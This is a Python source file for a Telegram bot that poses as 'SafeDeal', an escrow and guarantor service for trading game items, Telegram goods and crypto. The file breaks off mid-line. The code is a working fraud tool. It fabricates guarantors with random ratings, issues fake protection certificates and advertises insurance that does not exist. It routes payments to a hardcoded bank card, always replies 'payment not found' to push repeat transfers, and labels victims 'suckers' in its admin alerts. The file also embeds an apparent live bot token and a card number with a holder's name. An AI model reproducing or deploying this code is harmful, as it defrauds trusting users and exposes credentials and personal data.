import asyncio, logging, random
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode

BOT_TOKEN = "8856958854:AAHUShuODrvX9xG5H8btqLnE1nhZDJNRryo"
ADMIN_ID = 7263901569
SUPPORT_USERNAME = "@safedeal_support"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_sessions = {}
pending_deals = {}
admin_data = {"requisites": "4177 4901 4338 9205\nГулумкан Д.", "deals_count": 0}

FIRST_NAMES = ["Александр", "Михаил", "Дмитрий", "Сергей", "Андрей", "Владимир"]
LAST_NAMES = ["Смирнов", "Кузнецов", "Попов", "Васильев", "Петров", "Соколов"]
EMOJIS = ["🛡", "🔒", "💎", "🎯", "🏆", "⚡"]

def generate_garants():
    g = {}
    used = set()
    for _ in range(10):
        while True:
            name = random.choice(FIRST_NAMES) + " " + random.choice(LAST_NAMES)
            if name not in used:
                used.add(name)
                break
        gid = "gar_" + str(random.randint(1000, 9999))
        g[gid] = {
            "name": name,
            "deals": random.randint(500, 3500),
            "rating": round(random.uniform(4.5, 5.0), 2),
            "emoji": random.choice(EMOJIS)
        }
    return g

GARANTS = generate_garants()

GAMES = {
    "Roblox": ["Adopt Me", "MM2", "Steal A Brainrot", "Grow A Garden", "BloxFruits", "Rivals", "JJS", "Robux"],
    "Brawl Stars": ["Гемы", "Аккаунты", "Brawl Pass", "Скины"],
    "PUBG Mobile": ["UC", "Аккаунты", "Скины"],
    "Free Fire": ["Алмазы", "Аккаунты"],
    "Minecraft": ["Лицензия", "Hypixel Coins"]
}

TELEGRAM_ITEMS = ["NFT", "Telegram Stars", "Telegram Premium", "TG Канал", "TG Подарки"]

def generate_cert():
    return "CERT-" + str(random.randint(100000, 999999))

def make_kb(buttons, row_width=1):
    kb = []
    row = []
    for text, cb in buttons:
        row.append(InlineKeyboardButton(text=text, callback_data=cb))
        if len(row) >= row_width:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    return InlineKeyboardMarkup(inline_keyboard=kb)

def start_kb():
    return make_kb([
        ("🎮 Игровой маркетплейс", "gaming"),
        ("✈️ Telegram раздел", "telegram"),
        ("💱 Крипта / Обмен", "crypto"),
        ("🔗 Присоединиться к сделке", "join"),
        ("🔍 Выбрать гаранта", "garants"),
        ("🛡 Защита сделок", "protection"),
        ("💰 Кошелёк", "wallet"),
        ("ℹ️ Как работает", "how"),
        ("📞 Саппорт 24/7", "support")
    ])

def back_kb():
    return make_kb([("🔙 Назад", "back")])

def wait_kb():
    return make_kb([("❌ Отменить сделку", "cancel_deal")])

def paid_kb(uid):
    return make_kb([
        ("✅ Я оплатил", "paid_" + str(uid)),
        ("❌ Отменить", "cancel_" + str(uid))
    ])

def admin_kb(deal_id):
    return make_kb([
        ("💰 Отправить реквизиты", "areq_" + deal_id),
        ("💬 Написать", "amsg_" + deal_id),
        ("📋 Сертификат", "acert_" + deal_id),
        ("⏳ Статус: проверка", "astat_" + deal_id),
        ("✅ Завершить", "adone_" + deal_id),
        ("❌ Отклонить", "acancel_" + deal_id)
    ])

@dp.message(Command("start"))
async def start(msg: types.Message):
    await msg.answer(
        "🛡 <b>SafeDeal Choice</b>\n\n✅ Проверен\n🔒 Защищённые сделки\n💳 0% комиссия\n\n<i>Выберите раздел:</i>",
        parse_mode=ParseMode.HTML, reply_markup=start_kb()
    )

@dp.message(Command("reply"))
async def reply_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    parts = msg.text.split(maxsplit=2)
    if len(parts) < 3:
        await msg.answer("❌ /reply SD-12345 текст")
        return
    deal_id = parts[1]
    text = parts[2]
    deal = pending_deals.get(deal_id)
    if not deal:
        await msg.answer("❌ Сделка не найдена")
        return
    for u in [deal["creator"], deal["partner"]]:
        if u:
            try:
                kb = paid_kb(u) if deal.get("req_sent") else wait_kb()
                await bot.send_message(u, "💬 <b>Гарант:</b>\n" + text, parse_mode=ParseMode.HTML, reply_markup=kb)
            except:
                pass
    await msg.answer("✅ Отправлено в " + deal_id)

@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    kb = make_kb([
        ("💰 Изменить реквизиты", "adm_changereq"),
        ("📊 Статистика", "adm_stats"),
        ("🔄 Новые гаранты", "adm_newgarants"),
        ("📋 Сделки", "adm_list")
    ])
    await msg.answer("<b>👑 Админ-панель</b>", parse_mode=ParseMode.HTML, reply_markup=kb)

@dp.callback_query(F.data == "adm_changereq")
async def change_req(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    user_sessions[call.from_user.id] = {"step": "changing_req"}
    await call.message.edit_text("💰 Введите новые реквизиты:", reply_markup=back_kb())

@dp.message(F.text)
async def handle_text(msg: types.Message):
    uid = msg.from_user.id
    
    if uid == ADMIN_ID and user_sessions.get(uid, {}).get("step") == "changing_req":
        admin_data["requisites"] = msg.text
        del user_sessions[uid]
        return await msg.answer("✅ Реквизиты обновлены!")
    
    if uid == ADMIN_ID and user_sessions.get(uid, {}).get("step") == "msg_to_deal":
        deal_id = user_sessions[uid]["deal_id"]
        deal = pending_deals.get(deal_id)
        del user_sessions[uid]
        if not deal:
            return await msg.answer("❌ Не найдена")
        for u in [deal["creator"], deal["partner"]]:
            if u:
                try:
                    kb = paid_kb(u) if deal.get("req_sent") else wait_kb()
                    await bot.send_message(u, "💬 <b>Гарант:</b>\n" + msg.html_text, parse_mode=ParseMode.HTML, reply_markup=kb)
                except:
                    pass
        return await msg.answer("✅ Отправлено!")
    
    if uid in user_sessions and user_sessions[uid].get("step") == "waiting_code":
        return await join_code(msg)
    
    for did, deal in pending_deals.items():
        if deal.get("partner") and uid in [deal["creator"], deal["partner"]]:
            other = deal["creator"] if uid == deal["partner"] else deal["partner"]
            sender_name = "Участник 1" if uid == deal["creator"] else "Участник 2"
            if other:
                try:
                    await bot.send_message(other, "💬 <b>" + sender_name + ":</b>\n" + msg.text, parse_mode=ParseMode.HTML)
                except:
                    pass
            await bot.send_message(ADMIN_ID,
                "📩 <b>Чат " + did + "</b>\n👤 " + sender_name + " | ID: <code>" + str(uid) + "</code>\n💬 " + msg.text + "\n\n<i>/reply " + did + " текст</i>",
                parse_mode=ParseMode.HTML)
            return
    
    if uid not in user_sessions or user_sessions[uid].get("step") != "waiting_info":
        return
    
    deal_id = user_sessions[uid]["deal_id"]
    user_sessions[uid]["info"] = msg.text
    user_sessions[uid]["step"] = "waiting_partner"
    cert = generate_cert()
    pending_deals[deal_id] = {
        "creator": uid, "partner": None, "info1": msg.text,
        "type": user_sessions[uid].get("type"),
        "game": user_sessions[uid].get("game"),
        "item": user_sessions[uid].get("item"),
        "req_sent": False, "cert": cert
    }
    await msg.answer(
        "✅ <b>Сделка " + deal_id + " создана!</b>\n\n📋 Код: <code>" + deal_id + "</code>\n🛡 Сертификат: <code>" + cert + "</code>\n\nОтправьте код партнёру.",
        parse_mode=ParseMode.HTML, reply_markup=wait_kb()
    )

@dp.callback_query(F.data == "adm_stats")
async def stats(call: types.CallbackQuery):
    await call.message.edit_text("📊 Сделок: " + str(admin_data["deals_count"]) + "\nАктивных: " + str(len(pending_deals)), reply_markup=back_kb())

@dp.callback_query(F.data == "adm_newgarants")
async def new_garants(call: types.CallbackQuery):
    global GARANTS
    GARANTS = generate_garants()
    await call.answer("✅ Обновлено!")

@dp.callback_query(F.data == "adm_list")
async def list_deals(call: types.CallbackQuery):
    if not pending_deals:
        await call.message.edit_text("Нет активных сделок.", reply_markup=back_kb())
        return
    text = "<b>Активные сделки:</b>\n\n"
    for did, d in pending_deals.items():
        text += "▫️ " + did + " | Участников: " + str(1 if d["partner"] is None else 2) + "\n"
    await call.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())

@dp.callback_query(F.data.startswith("amsg_"))
async def prompt_msg(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    user_sessions[call.from_user.id] = {"step": "msg_to_deal", "deal_id": deal_id}
    await call.message.edit_text("💬 Введите сообщение:", reply_markup=back_kb())

@dp.callback_query(F.data.startswith("areq_"))
async def send_reqs(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.get(deal_id)
    if not deal:
        return
    deal["req_sent"] = True
    cert = deal.get("cert", generate_cert())
    deal["cert"] = cert
    req_text = "💰 <b>РЕКВИЗИТЫ</b>\n\n<pre>" + admin_data["requisites"] + "</pre>\n\n🛡 Сертификат: <code>" + cert + "</code>\n\n<i>После перевода нажмите «Я оплатил».</i>"
    for u in [deal["creator"], deal["partner"]]:
        if u:
            try:
                await bot.send_message(u, req_text, parse_mode=ParseMode.HTML, reply_markup=paid_kb(u))
            except:
                pass
    await call.answer("✅ Отправлено!")

@dp.callback_query(F.data.startswith("acert_"))
async def send_cert(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.get(deal_id)
    if not deal:
        return
    cert = deal.get("cert", generate_cert())
    deal["cert"] = cert
    for u in [deal["creator"], deal["partner"]]:
        if u:
            try:
                await bot.send_message(u, "🛡 <b>СЕРТИФИКАТ</b>\n\nНомер: <code>" + cert + "</code>\nСтатус: ✅ Активна\nСтраховка: до 50 000₽", parse_mode=ParseMode.HTML)
            except:
                pass
    await call.answer("✅ Отправлен!")

@dp.callback_query(F.data.startswith("astat_"))
async def send_status(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.get(deal_id)
    if not deal:
        return
    for u in [deal["creator"], deal["partner"]]:
        if u:
            try:
                await bot.send_message(u, "⏳ <b>Статус:</b> проверка оплаты. Ожидайте.", parse_mode=ParseMode.HTML)
            except:
                pass
    await call.answer("✅ Отправлено!")

@dp.callback_query(F.data.startswith("adone_"))
async def done(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.pop(deal_id, None)
    if deal:
        cert = deal.get("cert", "N/A")
        for u in [deal["creator"], deal["partner"]]:
            if u:
                try:
                    await bot.send_message(u, "✅ <b>СДЕЛКА ЗАВЕРШЕНА!</b>\n\nСертификат: <code>" + cert + "</code>\nСтатус: ✅ Успешно", parse_mode=ParseMode.HTML)
                except:
                    pass
    await call.answer("✅ Завершено!")

@dp.callback_query(F.data.startswith("acancel_"))
async def cancel_deal_admin(call: types.CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    deal_id = call.data.split("_", 1)[1]
    deal = pending_deals.pop(deal_id, None)
    if deal:
        for u in [deal["creator"], deal["partner"]]:
            if u:
                try:
                    await bot.send_message(u, "❌ <b>Сделка отклонена.</b>", parse_mode=ParseMode.HTML)
                except:
                    pass
    await call.answer("❌ Отклонено!")

@dp.callback_query(F.data == "gaming")
async def gaming(call: types.CallbackQuery):
    buttons = [(("🎮 " + g), ("game_" + g)) for g in GAMES]
    buttons.append(("🔙 Назад", "back"))
    await call.message.edit_text("<b>🎮 Игровой маркетплейс</b>\n\nВыберите игру:", parse_mode=ParseMode.HTML, reply_markup=make_kb(buttons, 2))

@dp.callback_query(F.data.startswith("game_"))
async def game_items(call: types.CallbackQuery):
    game_name = call.data.split("_", 1)[1]
    if game_name not in GAMES:
        return
    buttons = [(("• " + item), ("item_" + game_name + "_" + item)) for item in GAMES[game_name]]
    buttons.append(("🔙 К играм", "gaming"))
    await call.message.edit_text("<b>" + game_name + "</b>\n\nВыберите предмет:", parse_mode=ParseMode.HTML, reply_markup=make_kb(buttons))

@dp.callback_query(F.data == "telegram")
async def telegram(call: types.CallbackQuery):
    buttons = [(("✈️ " + item), ("tgit_" + item)) for item in TELEGRAM_ITEMS]
    buttons.append(("🔙 Назад", "back"))
    await call.message.edit_text("<b>✈️ Telegram раздел</b>\n\nВыберите категорию:", parse_mode=ParseMode.HTML, reply_markup=make_kb(buttons))

@dp.callback_query(F.data.startswith("item_") or F.data.startswith("tgit_") or F.data == "crypto")
async def create_deal(call: types.CallbackQuery):
    uid = call.from_user.id
    data = call.data
    deal_id = "SD-" + str(random.randint(10000, 99999))
    
    if data == "crypto":
        user_sessions[uid] = {"deal_id": deal_id, "type": "crypto", "step": "waiting_info"}
        await call.message.edit_text("📝 <b>Сделка " + deal_id + "</b>\n\n💱 Крипта / Обмен\n\nВведите условия:", parse_mode=ParseMode.HTML, reply_markup=back_kb())
    elif data.startswith("tgit_"):
        item = data.split("_", 1)[1]
        user_sessions[uid] = {"deal_id": deal_id, "type": "tg", "item": item, "step": "waiting_info"}
        await call.message.edit_text("📝 <b>Сделка " + deal_id + "</b>\n\n✈️ " + item + "\n\nВведите условия:", parse_mode=ParseMode.HTML, reply_markup=back_kb())
    else:
        parts = data.split("_", 2)
        game = parts[1]
        item = parts[2]
        user_sessions[uid] = {"deal_id": deal_id, "type": "game", "game": game, "item": item, "step": "waiting_info"}
        await call.message.edit_text("📝 <b>Сделка " + deal_id + "</b>\n\n🎮 " + game + " → " + item + "\n\nВведите условия:", parse_mode=ParseMode.HTML, reply_markup=back_kb())

@dp.callback_query(F.data == "join")
async def join(call: types.CallbackQuery):
    user_sessions[call.from_user.id] = {"step": "waiting_code"}
    await call.message.edit_text("🔗 Введите код сделки (SD-...):", reply_markup=back_kb())

async def join_code(msg: types.Message):
    uid = msg.from_user.id
    code = msg.text.strip()
    if code not in pending_deals:
        return await msg.answer("❌ Сделка не найдена.")
    deal = pending_deals[code]
    if deal["partner"]:
        return await msg.answer("❌ Сделка уже занята.")
    if deal["creator"] == uid:
        return await msg.answer("❌ Вы уже в этой сделке.")
    for did, d in pending_deals.items():
        if d.get("partner") and uid in [d["creator"], d["partner"]]:
            return await msg.answer("❌ Вы уже участвуете в другой сделке.")
    
    deal["partner"] = uid
    admin_data["deals_count"] += 1
    cid = deal["creator"]
    user_sessions[uid] = {"deal_id": code, "step": "in_deal"}
    user_sessions[cid]["step"] = "in_deal"
    
    await bot.send_message(ADMIN_ID,
        "💰 <b>СДЕЛКА " + code + "</b>\n\n"
        "👤 Лох 1: @" + (await bot.get_chat(cid)).username + " | <code>" + str(cid) + "</code>\n"
        "💬 " + deal["info1"] + "\n\n"
        "👤 Лох 2: @" + msg.from_user.username + " | <code>" + str(uid) + "</code>\n\n"
        "🛡 Сертификат: <code>" + deal.get("cert", "N/A") + "</code>\n\n"
        "<i>/reply " + code + " текст</i>",
        parse_mode=ParseMode.HTML, reply_markup=admin_kb(code))
    
    for u in [cid, uid]:
        await bot.send_message(u,
            "✅ <b>Пара найдена!</b>\n\n"
            "🛡 Сделка: " + code + "\n"
            "📋 Сертификат: <code>" + deal.get("cert", "N/A") + "</code>\n"
            "🔒 Статус: Защищено SafeDeal\n\n"
            "<i>Гарант подключается. Все сообщения видны участникам.</i>",
            parse_mode=ParseMode.HTML, reply_markup=wait_kb())

@dp.callback_query(F.data == "protection")
async def protection(call: types.CallbackQuery):
    await call.message.edit_text(
        "🛡 <b>ЗАЩИТА СДЕЛОК SafeDeal</b>\n\n"
        "▫️ Все сделки застрахованы до 50 000₽\n"
        "▫️ Сертификат защиты на каждую сделку\n"
        "▫️ Проверка участников\n"
        "▫️ Арбитраж 24/7\n"
        "▫️ Возврат при нарушении условий\n"
        "▫️ 0% комиссия\n\n"
        "<i>SafeDeal — доверенный сервис с 2024 года.</i>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb()
    )

@dp.callback_query(F.data.startswith("paid_"))
async def paid(call: types.CallbackQuery):
    uid = int(call.data.split("_")[1])
    await call.message.edit_text("⏳ Проверяем поступление...")
    await asyncio.sleep(5)
    await bot.send_message(ADMIN_ID, "⚠️ Лох " + str(uid) + " говорит, что перевёл!")
    await call.message.answer("❌ <b>Платёж не найден.</b>\n\nПовторите перевод или уточните реквизиты.", parse_mode=ParseMode.HTML, reply_markup=paid_kb(uid))

@dp.callback_query(F.data.startswith("cancel_") or F.data == "cancel_deal")
async def cancel_lox(call: types.CallbackQuery):
    uid = call.from_user.id
    if call.data.startswith("cancel_"):
        uid = int(call.data.split("_")[1])
    did = user_sessions.get(uid, {}).get("deal_id")
    if did in pending_deals:
        deal = pending_deals.pop(did)
        other = deal["creator"] if uid == deal["partner"] else deal["partner"]
        if other:
            try:
                await bot.send_message(other, "❌ Участник отменил сделку.")
            except:
                pass
        await bot.send_message(ADMIN_ID, "ℹ️ Сделка " + did + " отменена.")
    if uid in user_sessions:
        del user_sessions[uid]
    await call.message.edit_text("❌ Сделка отменена.")

@dp.callback_query(F.data == "back")
async def back(call: types.CallbackQuery):
    if call.from_user.id in user_sessions:
        if user_sessions[call.from_user.id].get("step") == "in_deal":
            return await call.answer("❌ Вы в активной сделке!", show_alert=True)
        del user_sessions[call.from_user.id]
    await call.message.edit_text("🛡 <b>Меню</b>", parse_mode=ParseMode.HTML, reply_markup=start_kb())

@dp.callback_query(F.data == "how")
async def how(call: types.CallbackQuery):
    await call.message.edit_text(
        "<b>ℹ️ Как работает:</b>\n\n"
        "1️⃣ Выберите раздел и товар\n"
        "2️⃣ Введите условия сделки\n"
        "3️⃣ Отправьте код партнёру\n"
        "4️⃣ Партнёр вводит код\n"
        "5️⃣ Гарант присылает реквизиты\n"
        "6️⃣ Оплата → сделка завершена\n\n"
        "🛡 Все сделки защищены сертификатом.\n"
        "<i>Комиссия: 0%</i>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb()
    )

@dp.callback_query(F.data == "support")
async def support(call: types.CallbackQuery):
    await call.answer("📞 " + SUPPORT_USERNAME + " (24/7)", show_alert=True)

@dp.callback_query(F.data == "wallet")
async def wallet(call: types.CallbackQuery):
    await call.message.edit_text(
        "💰 <b>Кошелёк SafeDeal</b>\n\n"
        "👤 @" + call.from_user.username + "\n"
        "💳 Баланс: 0₽\n"
        "📊 Сделок: 0\n"
        "⭐ Рейтинг: 0/10\n\n"
        "<i>Пополняйте баланс для быстрых сделок.</i>",
        parse_mode=ParseMode.HTML, reply_markup=back_kb()
    )

@dp.callback_query(F.data == "garants")
async def garants(call: types.CallbackQuery):
    buttons = []
    for gid, g in GARANTS.items():
        btn_text = g["emoji"] + " " + g["name"] + " | " + str(g["deals"]) + " | " + str(g["rating"]) + "⭐"
        buttons.append((btn_text, "g